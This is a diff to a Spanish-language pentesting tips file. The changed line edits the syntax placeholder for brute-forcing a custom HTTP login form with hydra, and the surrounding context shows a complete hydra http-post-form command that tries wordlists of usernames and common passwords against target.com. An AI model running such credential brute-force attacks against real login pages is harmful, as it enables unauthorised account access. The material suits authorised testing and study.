@@ -471,7 +471,7 @@ Ahora cuando queramos iniciar un ataque al puerto ```8080``` de la maquina remot
 
 ## Tip #10: Fuerza bruta con hydra al protocolo HTTP
 ## Custom http login
-Se puede realizar fuerza bruta en logins personalizados solo obteniendo los parametros a enviar en la petición, esto se realiza mediante burpsuite y posteriormente se especifica a hydra de la siguiente forma ````dominio metodo "/ruta-del-login:parametro1=^USER^&parametro2=^PASS^&Login=Login:<Texto si el login es invalido>"```
+Se puede realizar fuerza bruta en logins personalizados solo obteniendo los parametros a enviar en la petición, esto se realiza mediante burpsuite y posteriormente se especifica a hydra de la siguiente forma ````dominio metodo "/ruta-del-login:parametro1=^USER^&parametro2=^PASS^&Login=Login:'texto si el login es invalido'"```
 ```bash
 ┌──(root㉿pentest)-[~]
 └─# hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt  -P /root/Desktop/wordlists/100-common-passwords.txt target.com http-post-form \ "/login:username=^USER^&password=^PASS^&Login=Login:Invalid username or password"
